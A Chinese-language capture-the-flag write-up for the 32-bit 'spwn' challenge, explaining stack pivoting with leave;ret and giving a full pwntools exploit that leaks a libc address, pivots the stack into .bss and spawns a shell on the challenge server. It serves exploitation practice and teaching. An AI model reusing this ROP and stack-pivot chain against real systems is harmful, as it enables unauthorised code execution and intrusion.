---
title: spwn (栈偏移)
categories: 
    - Stack
    - spwn (栈偏移)
---
# spwn (栈偏移)
<!--more-->

32bit程序

看ida

![20201206182837](https://raw.githubusercontent.com/YTrick/image/branch/image/20201206182837.png)

汇编中发现 leave retn

![20201206183042](https://raw.githubusercontent.com/YTrick/image/branch/image/20201206183042.png)

leave retn：

```
leave ==> mov esp, ebp;  pop ebp;
retn  ==> pop eip
```

其中pop eip相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次leave ret即可控制esp为我们想要的地址。由于有pop ebp，会使esp-4（64位-8），将ebp 覆盖为想要调整的位置-4（64位-8）即可

exp:

```python
from pwn import *
from LibcSearcher import *

p=remote('node3.buuoj.cn',26070)
#p=process('./spwn')
elf=ELF('./spwn')
write_plt=elf.plt['write']
write_got=elf.got['write']
main_addr=elf.symbols['main']
bss_addr=0x0804A300
leave_ret=0x08048511

payload=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
p.recvuntil("What is your name?")
p.send(payload)

payload1='a'*0x18+p32(bss_addr-4)+p32(leave_ret)
p.recvuntil("What do you want to say?")
p.send(payload1)

write_addr=u32(p.recv(4))
print(hex(write_addr))
libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
sys_addr=libc_base+libc.dump('system')
bin_addr=libc_base+libc.dump('str_bin_sh')

p.recvuntil("What is your name?")
payload=p32(sys_addr)+'aaaa'+p32(bin_addr)
p.send(payload)

p.recvuntil("What do you want to say?")
p.send(payload1)

p.interactive()
```